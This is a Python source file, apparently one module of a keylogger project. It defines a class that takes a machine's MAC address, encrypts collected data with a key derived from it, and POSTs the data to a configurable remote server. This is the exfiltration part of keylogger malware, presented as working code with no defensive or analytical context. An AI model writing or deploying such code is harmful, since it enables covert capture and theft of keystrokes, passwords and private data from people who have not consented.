import json

import requests
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt


class NetworkWrite:
    def __init__(self, server_link):
        self.__server_link = server_link
        self.__mac = get_mac_address()


    def write_to_server(self, data):
        try:
            key = Encrypt.create_key(self.__mac)
            data = Encrypt.encrypt_data(data, key)
            send_data = {'data': str(data), 'mac': self.__mac}
            res=requests.post(self.__server_link, json=send_data)
            print(res)
            print('status: ',res.status_code)
        except Exception as e:
            print(e)